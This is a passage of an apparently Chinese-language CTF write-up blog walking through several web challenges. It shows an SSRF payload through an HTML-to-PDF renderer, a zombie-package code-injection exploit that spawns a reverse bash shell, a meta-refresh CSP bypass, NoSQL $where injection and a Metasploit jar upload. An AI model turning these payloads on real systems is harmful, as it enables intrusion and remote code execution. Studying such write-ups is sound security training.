router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/files/:id'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> token <span class="token operator">=</span> req<span class="token punctuation">.</span>signedCookies<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">&amp;&amp;</span> token<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'superuser'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Superuser is disabled now'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> filename <span class="token operator">=</span> <span class="token keyword">await</span> DB<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>/admin</code>路由可以自己输入内容，然后用HTML转PDF渲染一个PDF出来，不过有超级过滤，不给输标签。<code>/api/files</code>路由必须本地访问，可以添加记录且所有参数均可控，而<code>/api/files/:id</code>路由可以通过checkSum读文件。<br>但因为这里的checksum是加盐算出来的，所以在admin路由下生成的PDF其实是没法拿到checksum没法读到的。但是<code>/api/files</code>是可以自己添加文件的，而<code>/api/files/:id</code>读文件是直接拼接文件路径的，所以只要能本地访问&#x2F;api&#x2F;files路由添加一条flag记录，checksum可控再去<code>/api/files/:id</code>下拿flag</p>
<p>那么ssrf打本地的任务就只能落在这个HTML转PDF功能上了，之前做了几个fireshellCTF的题目，他们就出过这个类型的题，因为HTML转PDF时，HTML里面的资源肯定是要加载进来的，比如图片，CSS样式之类的，那么要去加载这个资源就必定会请求这个资源，请求这个资源不就是ssrf吗？</p>
<p>而这里用了尖括号过滤不让加标签，但这个绕过非常简单，经典数组绕过，令输入是个数组就能搞定了，而渲染的时候完全不会受到数组这个数据类型的影响（其实他别的路由都检测了输入是不是string，而这里没检测，也挺明显的。。。）<br>输一个<code>&lt;img src=&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=aa/../flag&amp;checksum=123&quot;</code><br>然后就可以去<code>/api/files/123</code>拿flag了</p>
<p>这里有一个小小坑，filename直接输flag的话，一打容器就爆炸，最后发现是数据库里面有这么一条</p>
<pre class=" language-mysql"><code class="language-mysql">    CREATE TABLE IF NOT EXISTS files (
            username   VARCHAR(255) NOT NULL,
            filename   VARCHAR(255) NOT NULL UNIQUE,
            checksum   VARCHAR(255) NOT NULL
        );
</code></pre>
<p>filename是不能重复的，幸好他的文件名也是拼接的，所以直接写个垃圾目录跳出来就行</p>
<h2 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h2><p>代码量大一点，不过关键部分也就一个文件，登录注册没什么看的，主要看user.js<br>大体功能就是用户可以输入一个网址，然后通过验证爬虫就会去爬那个网址<br>有一定的检验</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"http:"</span> <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"https:"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'oss-cn-beijing.ichunqiu.com'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
</code></pre>
<p>这个域名包含有域名的之前添加一条解析记录就行，没域名的把路径里塞一个叫这个名字的文件也行</p>
<p>这是第一步，将输入添加到用户的<code>personalBucket</code>，接下来需要域名满足如下条件，才会返回一个token</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>bucket<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`/user/verify?token=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>authToken<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个正则写的超级严，并且也没法绕了，但不这样似乎没法获得token</p>
<p>最后是verify路由，需要输入一个正确的token，就会把用户的personalBucket放到bucket里面，就可以让爬虫去访问了</p>
<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token <span class="token operator">||</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Parameters error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findByPk</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        token<span class="token punctuation">,</span>
        userId<span class="token punctuation">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">,</span>
        valid<span class="token punctuation">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                valid<span class="token punctuation">:</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                where<span class="token punctuation">:</span> <span class="token punctuation">{</span> userId<span class="token punctuation">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                bucket<span class="token punctuation">:</span> user<span class="token punctuation">.</span>personalBucket
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                where<span class="token punctuation">:</span> <span class="token punctuation">{</span> userId<span class="token punctuation">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findByPk</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> user<span class="token punctuation">,</span> message<span class="token punctuation">:</span> <span class="token string">"Successfully update your bucket from personal bucket!"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findByPk</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> user<span class="token punctuation">,</span> message<span class="token punctuation">:</span> <span class="token string">"Failed to update, check your token carefully"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>理论上这里findOne得输入之前生成的那个正确的token才能过result，不知道为什么，在尝试的时候乱按了几下，也显示成功更新了（？）后来发现好像随便输入token都能正常更新？不知道是这里哪里出了问题</p>
<p>那么接下来就可以让爬虫去爬取我们指定的链接了。简单测试下来发现这个爬虫的实现并不是很好，接受重定向是很合理的，但是他支持重定向更改协议，直接改成file协议，就能读本地文件，读&#x2F;flag容器直接爆炸，出题人又说要rce，试着读了一下&#x2F;readflag，没想到还真有，那就只能想办法rce了，这个爬虫是一个叫zombie的库，18年就不更新了，然后队友找到了这篇文章<br><a href="https://ha.cker.in/index.php/Article/13563">Code Injection Vulnerability in zombie Package</a><br>把payload改为反弹shell即可</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> codeToExec <span class="token operator">=</span> <span class="token string">"var sync=require('child_process').spawnSync; "</span> <span class="token operator">+</span>
    <span class="token string">"var ls = sync('bash', ['-c', 'bash -i .......']); console.log(ls.output.toString());"</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> exploit <span class="token operator">=</span> <span class="token string">"c='constructor';require=this[c][c]('return process')().mainModule.require;"</span> <span class="token operator">+</span> codeToExec<span class="token punctuation">;</span>
<span class="token keyword">var</span> attackVector <span class="token operator">=</span> <span class="token string">"c='constructor';this[c][c](\""</span> <span class="token operator">+</span> exploit <span class="token operator">+</span> <span class="token string">"\")()"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// end exploit</span>

<span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;script>"</span> <span class="token operator">+</span> attackVector <span class="token operator">+</span> <span class="token string">"&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接下来的题都是我没做出来的了呜呜</p>
<h2 id="PackageManager2021"><a href="#PackageManager2021" class="headerlink" title="PackageManager2021"></a>PackageManager2021</h2><p>这个题，有一个bot，有一个超强CSP，还有csrftoken，我一直认为这是一个超级xss或者csrf题，从而思考了一天。今天看神仙的wp，才知道原来是个SQL注入。。。</p>
<p>还是顺着思路来理一下<br>用的MongoDB，nosql理论上是很难有注入的，所以登录注册这些点确实也没有注入。登进来以后有几个操作，添加一个package，搜索package，认证授权，授权后可向admin提交链接</p>
<p>添加package的地方可以xss，但是存在无敌的csp</p>
<pre class=" language-javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token string">"default-src 'none';style-src 'self' 'sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=';img-src 'self';form-action 'self';base-uri 'none';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'X-Content-Type-Options'</span><span class="token punctuation">,</span><span class="token string">'nosniff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>无敌了，观察了一下csrf token，只在POST的时候会带上csrf token，且似乎只会通过GET访问页面才会更新，我抓一个包反复POST的话是不会显示csrf token错误的。</p>
<p>无敌的CSP让我完全无法xss，观察一下向bot提交链接的代码，bot是这样进行访问的<br><code>page.goto(new URL(`/packages/$&#123;id&#125;`, base).toString());</code><br>也是无敌操作，如果前面这个参数没拼&#x2F;packages&#x2F;的话，翻文档上倒是有说会优先用前面这个参数覆盖base，这里也限定死了，打不通</p>
<p>然后强力的队友告诉我csp可以这样绕，我完全不知道，是我太垃圾了<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://x.x.x.x/&quot; &gt;</code><br>可以打csrf了，csrf的话这里有csrf token，所以post操作都做不了，get能进行的操作只有查package和访问特定package，访问特定package不如直接用题目给的接口。。。而查比较像一个xs-leak的点，查询的结果不同返回的状态码不同，虽然不能越过同源策略获取查询的内容，但的确可以从状态码去猜测结果。<br>然而这里的查不能像正常xs-leak那样一位一位的去试，他是直接把输入去查数据库的，顶多能试着猜flag然后验证flag对不对，然而想猜出来flag还是不太现实，似乎csrf计划不通</p>
<p>这里csp还有一句<code>style-src &#39;self&#39;</code>，style是可以引入css样式表的，而css也可以进行一定程度的猜测和盲注，比如安洵杯的一道cssgame，但是那个需要外带数据，这里无敌csp数据是无法外带的，没有机会。xss在csp下想外带数据感觉一定要能执行js，直接通过跳转的形式去外带数据，css这种靠加载资源来外带数据的，必然被无敌csp干碎</p>
<p>至此，不会了鸭</p>
<p>赛后看wp，出题人可真能藏啊，写了个bot来迷惑我呜呜呜，这里是不能直接向bot去提交链接的，必须过一部认证，而认证的过程是这样的</p>
<pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">let</span> <span class="token punctuation">{</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">!==</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkmd5Regex</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">let</span> docs <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">$where</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`this.username == "admin" &amp;&amp; hex_md5(this.password) == "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>token<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>docs<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>docs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isAdmin <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> error<span class="token punctuation">:</span> <span class="token string">'Failed to auth'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> error<span class="token punctuation">:</span> <span class="token string">'No matching results'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
</code></pre>
<p>这里一反常态，平常都是用的比较合理的查询方案，不存在注入，而这里用了一个where语句，且无任何过滤，但我做题的时候仅仅是用了万能密码绕过了权限，然后就一直在研究怎么攻击bot了。。。完美被迷惑呜呜呜，这里可以直接SQL注入拿到admin的密码，登上去看flag。。。<br>可以直接用<code>this.password[i]==&#39;x&#39;</code>这种下标访问的形式一位一位的拿到admin密码，nosql注入的语法和正常的注入不太一样，这里我还没怎么了解过</p>
<h2 id="安全监测"><a href="#安全监测" class="headerlink" title="安全监测"></a>安全监测</h2><p>出题人铁傻逼<br>喜欢藏，除了恶心人还能干什么<br>不想写wp，卡住了的话就只能是没扫目录没找到还藏了一个admin目录<br>可能不扫目录是我不够熟练吧，毕竟出了一百多个队的简单题</p>
<h2 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h2><p>java题，给了源码，但是似乎是个内网的服务，题目打开的话是一个<code>apache flink dashboard</code>，没见过，但是有一个上传jar功能，环境共用，看到一堆rce.jar，并且还显示入口类是metasploit，我直接百度，显示上传jar这里能直接传一个类执行rce，我也直接上kali整了一个，reverse_tcp理论上来说nc就能接，但是接到了就显示内存崩了，没执行上命令，还专门整了个frp把内网映射到公网。。。还整了个虚拟机映射，再把虚拟机端口映射到物理机，用msf自带的handler接，也连不上。可能还不如自己写一个runtime exec弹shell呢。。。。<br>不过就算连上了我看代码后半段是个fastjson，属于我不会的领域，也就算了。好菜呜呜</p>
<p>这个题本来不置可否，现在再给一个差评，赛时找队里的java大师他在给老板打工没空，赛后叫他带带我之后他直接告诉我这个题是抄他出过的一个题。害，要是赛时他在场就直接秒了。。。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>第五空间2021 wp</title>
    <url>/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42021%20wp.html</url>
    <content><![CDATA[<h1 id="第五空间2021-wp"><a href="#第五空间2021-wp" class="headerlink" title="第五空间2021 wp"></a>第五空间2021 wp</h1><p>不愧是500空间，日常平台500，题目出的稀碎，权限也不控制，睡一个午觉起来发现放题了，看了两分钟就hacked by lbw了，lbwnb!</p>
<p>最后还有一波诸神黄昏，十分钟掉十名，又到了我最喜欢的垂直上分环节</p>
<h2 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h2><p>远古远古框架，13年就没更新了。从GitHub上找到了源码拉了一版下来，审了半天感觉打不动，不进后台无敌防御，默认的账户登不上去。然后开始扫目录，发现大家已经写了这么多后门了啊，随便挑了几个猜后门密码，有一个猜对了，连上去在环境变量中获得flag<br>笑死了<br>连进去之后顺便检查了一遍admin的密码，确实是被改了，变成了一个八位数字（应该不是爆破密码吧。。。这还带验证码的）好奇师傅们是怎么打进去的</p>
<h2 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h2><p>ruby题，我没学过ruby，硬看，所幸代码量不大，猜都大概猜出来在说什么了</p>
<pre class=" language-ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'sinatra'</span>
<span class="token keyword">require</span> <span class="token string">'digest'</span>
<span class="token keyword">require</span> <span class="token string">'base64'</span>

get <span class="token string">'/'</span> <span class="token keyword">do</span>
  <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./view/index.html"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

get <span class="token string">'/upload'</span> <span class="token keyword">do</span>
  <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./view/upload.html"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

post <span class="token string">'/upload'</span> <span class="token keyword">do</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:tempfile</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:filename</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:filename</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'png'</span>
    <span class="token keyword">return</span> <span class="token string">"&lt;script>alert('error');location.href='/upload';&lt;/script>"</span>
  <span class="token keyword">end</span>
  <span class="token keyword">begin</span>
    filename <span class="token operator">=</span> <span class="token constant">Digest</span><span class="token punctuation">:</span><span class="token symbol">:MD5</span><span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token builtin">Time</span><span class="token punctuation">.</span>now<span class="token punctuation">.</span>to_i<span class="token punctuation">.</span>to_s <span class="token operator">+</span> params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:filename</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.png'</span>
    <span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">|</span>f<span class="token operator">|</span>
      f<span class="token punctuation">.</span>write <span class="token function">open</span><span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:file</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token symbol">:tempfile</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token string">"Upload success, file stored at <span class="token interpolation"><span class="token delimiter tag">#{</span>filename<span class="token delimiter tag">}</span></span>"</span>
  <span class="token keyword">rescue</span>
    <span class="token string">'something wrong'</span>
  <span class="token keyword">end</span>

<span class="token keyword">end</span>

get <span class="token string">'/convert'</span> <span class="token keyword">do</span>
  <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./view/convert.html"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

post <span class="token string">'/convert'</span> <span class="token keyword">do</span>
  <span class="token keyword">begin</span>
    <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
      <span class="token keyword">return</span> <span class="token string">"&lt;script>alert('error');location.href='/convert';&lt;/script>"</span>
    <span class="token keyword">end</span>

    file <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
    <span class="token keyword">unless</span> file<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">nil</span> <span class="token operator">&amp;&amp;</span> file<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">nil</span> <span class="token operator">&amp;&amp;</span> file <span class="token operator">=</span><span class="token operator">~</span> <span class="token regex">/^(.+)\.png$/</span>
      <span class="token keyword">return</span> <span class="token string">"&lt;script>alert('dont hack me');&lt;/script>"</span>
    <span class="token keyword">end</span>
    res <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    headers <span class="token string">'Content-Type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"text/html; charset=utf-8"</span>
